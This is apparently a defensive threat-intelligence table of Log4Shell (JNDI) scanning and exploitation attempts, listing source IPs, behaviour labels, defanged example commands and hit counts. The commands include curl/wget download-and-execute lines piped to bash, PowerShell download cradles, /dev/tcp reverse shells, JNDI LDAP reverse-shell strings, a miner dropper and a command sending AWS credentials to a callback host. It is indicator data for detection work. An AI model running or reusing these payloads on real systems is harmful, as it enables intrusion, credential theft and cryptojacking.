JNDI Referenced Suspicious IP	Suspicious Behavior	Example Command/Download	Count of IP seen with JNDI Base64 encoded curl	Count of IP seen with JNDI Base64 encoded wget	Count of IP seen with JNDI Base64 encoded telnet	Count of IP seen with JNDI Base64 encoded nc	Count of IP seen with JNDI Base64 encoded dig	Count of IP seen with JNDI Base64 encoded RCE attempt	Count of IP seen with JNDI Base64 encoded Powershell	Count of IP seen with JNDI Reverse Shell
45.155.205.233	Mass Scanning with Base64 encoded curl, wget, and local execution	(curl -s 45.155[.]205.233:5874/<redacted victim ip>:80||wget -q -O- 45[.]155.205.233:5874/<redacted victim ip>:80)|bash	<10000	<10000				<10000		
195.54.160.149	Mass Scanning with Base64 encoded curl, wget, and local execution	(curl -s 195[.]54.160.149:5874/<redacted victim ip>:80||wget -q -O- 195[.]54.160.149:5874/<redacted victim ip>:80)|bash	<10000	<10000				<10000		
135.148.143.217	Remote Code Download and Execution with Base64 encoded command	wget http[:]//152[.]67.63.150/py; curl -O http[:]//152[.]67.63.150/py; chmod 777 py; ./py rce.x86	<1000	<1000				<100		
45.137.21.9	Remote Code Download and Execution with Base64 encoded command	wget http[:]//62[.]210.130.250/lh.sh;chmod +x lh.sh;./lh.sh	<10	<1000				<1000		
81.30.157.43	Download and execute with double Base64 encoded command	cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http[:]//155[.]94.154.170/aaa;curl -O http[:]//155[.]94.154.170/aaa;chmod 777 aaa;./aaa	<100	<100				<10		
165.22.213.147	Reconnaissance with Base64 encoded interactsh token	dig <redacted victim ip>.$(whoami).$(hostname).<redacted token>.interact[.]sh	<10			1	<100	<10		
135.148.132.224	Remote Code Download and Execution with Base64 encoded command	wget http://152[.]67.63.150/py; curl -O http://152[.]67.63.150/py; chmod 777 py; ./py rce.x86	<100	<100				<10		
52.140.215.233	LIVE Remote Code Download and Execution with Base64 encoded command	cd /tmp;wget http[:]//155[.]94.154.170/aaa;curl -O http[:]//155[.]94.154.170/aaa;chmod +x aaa;./aaa	<100	<100						
37.233.99.127	Reconnaissance with Base64 encoded burpcollaborator token	curl <redacted innocuous domain>.<redacted token>.burpcollaborator[.]net/only_testing_plz_bug_bounty_xDDDD_joke	<100							
45.79.91.18	Reconnaissance with Base64 encoded command	curl http[:]//<redacted innocuous domain>.<redacted token>.burpcollaborator[.]net/	<100							
103.104.73.155	LIVE Remote Code Download and Execution with Base64 encoded command	(wget -O - http[:]//103[.]104.73.155:8002/acc||curl -o - http[:]//103[.]104.73.155:8002/acc)|/bin/bash	<10	<10				<10		
45.33.47.240	Reconnaissance with Base64 encoded command	curl http[:]//<redacted innocuous domain>.<redacted token>.interact[.]sh/	<100							
79.172.214.11	Remote Code Download and Execution with Base64 encoded command	curl 135[.]125.217.87/jndi.sh | bash	<10	1				<10		
192.210.200.66	Remote Code Download and Execution with Base64 encoded command	(curl -fsSL http://192[.]210.200.66:1234/xmss||wget -q -O - http://192[.]210.200.66:1234/xmss)|bash	<10	<10				<10		
167.86.70.252	Remote Code Download and Execution with Base64 encoded Powershell	cmd.exe /c powershell.exe -c Invoke-WebRequest http[:]//177[.]52.40.22:5000/xpert/app/lib/locawebstyle/dist/javascripts/log.php	<10	<10				1	1	
134.255.232.216	Remote Code Download and Execution with Base64 encoded command	wget 54[.]37.93.31/Brave/x86; chmod 777 x86; ./x86 <truncated log>		<10				<10		
2.56.59.123	LIVE Remote Code Download and Execution with Base64 encoded Powershell	powershell -c iex ((New-Object System.Net.WebClient).DownloadString('https[:]//textbin[.]net/raw/0l8h4xuvxe'))	<10	<10				<10	<10	
178.79.157.186	Remote Code Download and Execution with Base64 encoded command	(curl -s 178[.]79.157.186/?curl||wget 178[.]79.157.186/?wget)|bash	<10	<10				<10		
92.242.40.21	Remote Code Download and Execution with Base64 encoded command	(curl -s 92[.]242.40.21/lh.sh||wget -q -O- 92[.]242.40.21/lh.sh)|bash	<10	<10				<10		
194.36.188.187	Remote Code Download potentially truncated	wget http://194[.]36.188.187:9090/log/8831		<10						
199.217.117.92	Reconnaissance with Base64 encoded command	curl http[:]//<redacted innocuous domain>.<redacted token>.burpcollaborator[.]net/	<10							
142.44.203.85	LIVE MoneroOcean crypto miner via powershell	http://lurchmath[.]org/wordpress-temp/wp-content/plugins/mine.bat; 135[.]125.217.87/jndi.sh; https[:]//41[.]157.42.239/bk.sh	<10						1	
209.141.58.149	LIVE Remote Code Download and Execution with Base64 encoded command	echo &(wget -O - http[:]//209[.]141.58.149:8005/aa0||curl -o - http[:]//209[.]141.58.149:8005/aa0)|/bin/bash	1	1				1		
158.69.204.95	Remote Code Download and Execution with Base64 encoded command using compromised website	(curl -S https[:]//<redacted compromised website>/Scripts/op[.]php||wget https[:]//<redacted compromised website>/Scripts/op[.]php)|bash	1	1				1		
82.118.18.201	Remote Code Download and Execution with Base64 encoded command	(curl -s 82[.]118.18.201/lh.sh||wget -q -O- 82[.]118.18.201/lh.sh)|bash	1	1				1		
194.40.243.149	Remote Code Download and Execution with Base64 encoded command	(curl -s 194[.]40.243.149/lh.sh||wget -q -O- 194[.]40.243.149/lh.sh)|bash	1	1				1		
80.71.158.44	Remote Code Download and Execution with Base64 encoded command	(curl -s 80[.]71.158.44/lh.sh||wget -q -O- 80[.]71.158.44/lh.sh)|bash	1	1				1		
141.105.65.94	Base64 Encoded remote shell	/bin/bash -i >& /dev/tcp/141[.]105.65.94/81			1			1		
144.202.46.26	Remote Code Download with Base64 encoded command	curl -s http[:]//144[.]202.46.26:8087 || wget -q http[:]//144[.]202.46.26:8087	1	1						
140.143.45.223	JNDI Tomcat Bypass Base64 encoded reverse shell	bash -i >& /dev/tcp/140[.]143.45.223/6677 >&1						<10		
95.179.164.209	JNDI Commons Beanutils Reverse Shell	${jndi:ldap:/95[.]179.164.209:443/Deserialization/CommonsBeanutils1/ReverseShell/95[.]179.164.209/8080}								<10
5.249.162.249	Remote Code Download and Execution with Base64 encoded command	wget 54[.]37.93.31/x86; chmod 777 x86; ./x86 tokyo		1				1		
132.226.170.154	Remote Code Download and Execution with Base64 encoded command	(curl http[:]//164[.]52.212.196:88/vc || wget -q -O- http[:]//164[.]52.212.196:88/vc) | sh	1	1						
176.32.33.14	AWS Credential Harvesting with interactsh token	curl -d "$(cat ~/.aws/credentials)" https://<redacted token>.interactsh[.]com	<10							
64.225.54.148	Reconnaissance with Base64 encoded command	curl http[:]//64[.]225.54.148/<redacted victim domain>	<10							
159.223.5.30	JNDI Commons Beanutils Reverse Shell	${jndi:ldap://159[.]223.5.30:443/Deserialization/CommonsBeanutils1/ReverseShell/159[.]223.5.30/9998}								1
139.59.138.109	Base64 Encoded netcat connection	nc 139[.]59.138.109 8080				1				
167.99.32.139	JNDI Reverse Shell	${jndi:ldap://167[.]99.32.139:1389/Basic/ReverseShell/167[.]99.32.139/9999}								1
156.253.5.199	JNDI Reverse Shell	${jndi:ldap://156[.]253.5.199:1389/Basic/ReverseShell/156[.]253.5.199/8088}								1
2.56.57.208	Reconnaissance with Base64 encoded canarytoken	wget http[:]//canarytokens[.]com/static/<redacted token>		1						
83.138.53.135	LIVE Remote Code Download and Execution with Base64 encoded command	wget http[:]//83[.]138.53.135/p -O /tmp/p;chmod +x /tmp/p; <truncated log>		1						
161.35.0.78	Reconnaissance with Base64 encoded command	<redacted token>[.]burpcollaborator.net:65500/pwned		1						